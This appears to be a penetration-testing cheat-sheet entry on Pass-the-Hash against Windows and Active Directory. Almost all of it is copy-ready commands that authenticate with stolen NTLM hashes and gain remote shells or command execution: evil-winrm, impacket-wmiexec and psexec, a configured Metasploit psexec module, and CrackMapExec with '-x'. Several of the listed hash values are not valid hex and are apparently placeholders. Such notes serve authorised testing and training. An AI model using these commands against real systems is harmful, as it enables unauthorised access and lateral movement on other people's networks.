---
title: Pass-the-Hash (PtH)
category: ad
subcategory: ad-attacks
os: linux, windows
command: impacket-psexec -hashes :NTHASH user@target
tools: impacket-psexec, evil-winrm, impacket-wmiexec, crackmapexec
---


### evil-winrm

```bash
evil-winrm -u Administrator -H 37cb630168e5f82aafa8461e05c6bbd1 -i 10.130.126.152
```

### impacket-wmiexec

```bash
impacket-wmiexec -hashes :37cb630168e5f82aafa8461e05c6bbd1 Administrator@10.130.126.152
```

### impacket-psexec

```bash
impacket-psexec HALO/Administrator@10.130.126.152 -hashes :37cb630168e5f82aafa8461e05c6bbd1
rlwrap impacket-psexec HALO/Administrator@10.130.126.152 -hashes :37cb630168e5f82aafa8461e05c6bbd1
```

### Metasploit psexec with hash

```
use exploit/windows/smb/psexec
set SMBDomain WORKGROUP
set SMBUser administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:13e23qdadssadasdd1w1dw1wsd
set target Command
run
```

### CrackMapExec PtH + command exec

```bash
crackmapexec smb 10.2.25.212 -u Administrator -H "adfsdffew32r23rsdfdfsfds"
crackmapexec smb 10.2.25.212 -u Administrator -H "adfsdffew32r23rsdfdfsfds" -x "ipconfig"
```

### Limitation since 2014

PtH only works against the built-in local Administrator (RID 500) and domain accounts - not other local admin accounts.
